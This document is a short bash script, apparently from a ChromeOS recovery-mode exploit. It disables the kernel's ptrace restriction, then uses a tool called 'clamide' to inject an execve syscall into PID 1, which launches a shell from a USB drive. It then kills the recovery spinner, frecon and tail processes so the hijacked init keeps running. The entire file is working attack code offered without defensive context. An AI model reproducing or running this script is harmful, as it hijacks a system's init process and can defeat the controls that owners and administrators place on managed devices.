#!/bin/bash
# cros uses hardcoded paths, /usr/bin/env is only used on host
USB_MNT=/usb
set +x

echo 0 >/proc/sys/kernel/yama/ptrace_scope
if ! [ "$(cat /proc/sys/kernel/yama/ptrace_scope)" = "0" ]; then
    echo "failed to enable ptrace"
    sleep 1d
fi

echo "ptrace privledges granted. shellcode launching in 1 second"
sleep 1
clamide -p 1 --syscall execve "str:$USB_MNT/usr/sbin/bootstrap-shell"

echo "cleaning up from recovery"
spinner=$(pgrep sh | tail -1)
kill -9 $spinner
pkill -f frecon
pkill -f tail # the tail in question would typically stop pid1 from exiting. it is useless now.
